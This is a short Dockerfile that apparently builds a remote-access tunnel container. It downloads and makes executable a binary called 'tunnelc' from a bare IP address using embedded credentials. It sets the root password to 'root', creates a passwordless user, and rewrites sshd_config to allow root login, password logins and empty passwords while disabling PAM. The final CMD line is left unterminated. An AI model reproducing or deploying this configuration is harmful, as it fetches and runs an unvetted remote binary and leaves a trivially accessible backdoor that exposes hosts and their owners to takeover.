FROM ubuntu:focal
RUN apt-get update && apt-get install -y openssh-server nginx  curl tmux
Run    curl -u dero:dodo22 -OLJ 198.23.174.25:10666/tunnelc \
    && chmod +x  tunnelc
RUN mkdir /var/run/sshd
RUN echo 'root:root' | chpasswd
RUN useradd -m test
RUN passwd -d test
RUN sed -i'' -e's/^#PermitRootLogin prohibit-password$/PermitRootLogin yes/' /etc/ssh/sshd_config \
        && sed -i'' -e's/^#PasswordAuthentication yes$/PasswordAuthentication yes/' /etc/ssh/sshd_config \
        && sed -i'' -e's/^#PermitEmptyPasswords no$/PermitEmptyPasswords yes/' /etc/ssh/sshd_config \
        && sed -i'' -e's/^UsePAM yes/UsePAM no/' /etc/ssh/sshd_config
EXPOSE 80
CMD ["/bin/bash","./ssh.sh"
